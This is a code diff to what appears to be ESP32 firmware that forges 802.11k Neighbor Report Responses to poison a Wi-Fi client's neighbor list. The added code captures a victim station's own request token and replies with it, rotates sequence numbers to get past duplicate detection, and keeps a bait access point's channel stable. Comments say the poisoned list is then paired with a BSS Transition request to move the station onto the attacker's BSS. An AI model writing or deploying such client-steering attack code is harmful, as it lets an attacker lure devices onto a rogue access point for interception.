@@ -22,13 +22,19 @@
 //     is 0 rather than a bit table copied from somewhere. Fill them from a real
 //     Neighbor Report Response captured on the bench (lab/cap_frames.py decodes
 //     tag 52 and prints the info word as hex) and compare field by field.
-//   * TODO: whether a client honours an *unsolicited* Neighbor Report Response
-//     (one it never asked for) is implementation behaviour. This module always
-//     sends a dialog token, so the client at least has a value to match against a
-//     request it never made; the acceptance test is the bench experiment, not a
-//     guess written here.
+//   * Measured: an *unsolicited* response does nothing on an ESP-IDF station --
+//     it never even reports WIFI_EVENT_STA_NEIGHBOR_REP (测试报告 §4.4.12). So the
+//     useful shape is the answering one: watch for the victim's own Neighbor
+//     Report Request (cat 5 act 4), remember its dialog token, and reply with that
+//     token inside a short window. A stack that asked for neighbours is far more
+//     likely to read the answer than one that never did. `rrmtokhit=` counts how
+//     many frames went out carrying a victim's token instead of the fixed one.
+//   * The poisoned list then feeds the BTM module: first make the station record
+//     our second BSS as a neighbour, then send the BTM Request and let it move.
+//     Neither half is enough on its own when the candidate is not scannable.
 
 #include "rrm.h"
+#include "baitap.h"
 #include "radio.h"
 
 #include <Arduino.h>
@@ -42,8 +48,9 @@
 
 namespace {
 
-const uint8_t kSeqHigh = 0xF0;
-const uint8_t kSeqLow = 0xFF;
+// A fixed sequence number is thrown away by the station's duplicate detector after
+// the first copy, so a repeating spoof must advance it.
+uint16_t s_seq;
 
 // Radio Measurement Action field values.
 const uint8_t kCategoryRrm = 5;
@@ -62,6 +69,8 @@ const uint32_t kRepeatMs = 300;
 // tx_guard.h), so the per-client interval must not be multiplied by the number of
 // clients on the air.
 const uint32_t kGlobalGapMs = 50;
+// 受害者的请求能"认"多久。太长会让回执看起来像在乱猜，太短则一次请求覆盖不到下一轮。
+const uint32_t kTokenWindowMs = 5000;
 
 struct client_t {
     uint8_t mac[6];
@@ -85,6 +94,12 @@ bool s_unlimited;
 uint32_t s_frames;
 uint32_t s_requests;
 uint32_t s_responses;
+// 受害者最近一次 Neighbor Report Request 的 dialog token，用来应答它自己
+uint8_t s_req_mac[6];
+uint8_t s_req_token;
+uint32_t s_req_ms;
+bool s_req_valid;
+uint32_t s_token_hits;
 client_t s_clients[kMaxClients];
 int s_client_count;
 uint32_t s_last_tx_ms;
@@ -117,8 +132,9 @@ size_t build_nbr_response(uint8_t* frame, const uint8_t sta[6], uint8_t dialog) 
     memcpy(frame + 4, sta, 6);
     memcpy(frame + 10, s_bssid, 6);
     memcpy(frame + 16, s_bssid, 6);
-    frame[22] = kSeqHigh;
-    frame[23] = kSeqLow;
+    const uint16_t seq = s_seq++ & 0x0FFF;
+    frame[22] = (uint8_t)(seq >> 4);
+    frame[23] = (uint8_t)((seq & 0x0F) << 4);
 
     size_t n = 24;
     frame[n++] = kCategoryRrm;
@@ -163,9 +179,18 @@ bool rrm_start(int index, const uint8_t candidate_bssid[6], uint8_t candidate_ch
     s_frames = 0;
     s_requests = 0;
     s_responses = 0;
+    s_req_valid = false;
+    memset(s_req_mac, 0, 6);
+    s_req_token = 0;
+    s_req_ms = 0;
+    s_token_hits = 0;
     s_last_tx_ms = 0;
 
-    radio_set_channel("rrm", s_channel);
+    // Skip the retune when the bait AP already sits on this channel: esp_wifi_set_channel
+    // restarts the AP's beacon, which would drop a station that just roamed onto it.
+    if (!(baitap_running() && baitap_channel() == s_channel)) {
+        radio_set_channel("rrm", s_channel);
+    }
     // Without the receive callback no station is ever learned and every report
     // would go out blind.
     attack_sniffer_enable();
@@ -201,10 +226,21 @@ void rrm_step(void) {
             continue;
         }
         c->last_ms = now;
+        // 这个 STA 最近问过邻居吗？问过就用它自己的 token 回，别回一个它没发过的。
+        uint8_t dialog = s_token;
+        bool echoed = false;
+        if (s_req_valid && now - s_req_ms <= kTokenWindowMs &&
+            memcmp(c->mac, s_req_mac, 6) == 0) {
+            dialog = s_req_token;
+            echoed = true;
+        }
         uint8_t frame[64];
-        const size_t len = build_nbr_response(frame, c->mac, s_token);
+        const size_t len = build_nbr_response(frame, c->mac, dialog);
         if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
             s_frames++;
+            if (echoed) {
+                s_token_hits++;
+            }
             c->sent++;
             s_last_tx_ms = now;
             if (!s_unlimited && s_left > 0) {
@@ -228,6 +264,11 @@ void rrm_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype
         // a response from the AP is the frame shape we are reproducing.
         if (frame[25] == kActionNbrReportReq) {
             s_requests++;
+            // 记下"谁问了、token 是几"，下一步就用它自己这个值回过去
+            memcpy(s_req_mac, src, 6);
+            s_req_token = frame[26];
+            s_req_ms = millis();
+            s_req_valid = true;
         } else if (frame[25] == kActionNbrResponse) {
             s_responses++;
         }
@@ -314,6 +355,10 @@ uint8_t rrm_remaining(void) {
 
 uint32_t rrm_requests(void) {
     return s_requests;
+}
+
+uint32_t rrm_token_hits(void) {
+    return s_token_hits;
 }
 
 uint32_t rrm_responses(void) {
